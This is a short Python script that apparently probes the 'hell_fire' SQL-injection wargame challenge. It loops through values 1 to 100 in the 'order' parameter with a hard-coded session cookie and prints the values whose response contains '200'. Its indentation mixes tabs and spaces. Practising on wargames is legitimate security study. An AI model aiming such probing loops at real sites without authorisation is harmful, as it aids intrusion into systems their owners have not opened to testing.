import requests

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order="
session = {'PHPSESSID':'1pnndupij0939bhhc7o1etb71b'}
payload2 = ""


for i in range(1,101):
        payload=str(i)
        #print(str(i)+" payload = "+url+payload)
        
        request = requests.post(url+payload, cookies=session)
        if "200" in request.text:
		print("Find!! : "+str(i))
        else:
            continue


print("Finish!!")

